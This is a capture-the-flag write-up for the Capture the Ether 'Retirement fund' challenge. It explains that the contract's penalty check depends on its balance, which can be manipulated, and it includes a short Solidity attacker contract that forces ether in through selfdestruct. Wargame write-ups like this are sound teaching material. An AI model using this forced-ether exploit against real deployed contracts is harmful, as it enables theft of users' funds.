# Retirement fund Capture the ether

## Goals

=> I’ve committed 1 ether to the contract below, and I won’t withdraw it until 10 years have passed. If I do withdraw early, 10% of my ether goes to the beneficiary (you!).

I really don’t want you to have 0.1 of my ether, so I’m resolved to leave those funds alone until 10 years from now. Good luck!

### Hints

- None

### Solution

- When you read the `function collectPenalty()` which is the only function we as the player can call, you see the require statement just checks if `startBalance - address(this).balance` is greater than zero, since we can force ETH into the contract this check is not secure and we can just transfer some ETH into the contract (in my case by using a selfdestruct contract) and then we get the whole balance of the contract

### Attacker Contract

```solidity
contract Hack {
    RetirementFundChallenge targetContract;

    constructor(address _targetContract) public {
        targetContract = RetirementFundChallenge(_targetContract);
    }

    function sendEther() public payable {
        selfdestruct(address(targetContract));
    }

    function() external payable {}
}
```
